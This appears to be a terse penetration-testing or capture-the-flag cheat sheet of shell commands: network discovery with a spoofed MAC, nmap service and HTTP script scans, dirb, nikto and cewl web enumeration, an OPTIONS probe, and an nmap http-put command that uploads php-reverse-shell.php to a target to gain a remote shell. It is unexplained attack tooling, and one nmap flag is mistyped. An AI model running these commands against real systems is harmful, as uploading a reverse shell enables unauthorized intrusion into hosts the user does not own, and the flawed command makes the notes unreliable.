arp-scan -I eth0 --srcaddr=DE:AD:BE:EF:CA:BA <ip>/24
nmap -sC sV <ip> -oA nmap/<ip>
nmap -sC -sV -p 80 --script "http-*" <ip>
apt-get install cewl -y
dirb http://<ip>/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X php,html,sh -o dirb.txt -w
cewl http://<site> > list.txt
nikto -h <ip> -o nikto.txt

curl -v -X OPTIONS http://<ip>
nmap -p80 <ip> --script http-put --script-args http-put.url='/test/php-reverse-shell.php',http-put.file='php-reverse-shell.php'

tesseract blow.jpg output --oem 1 -l eng
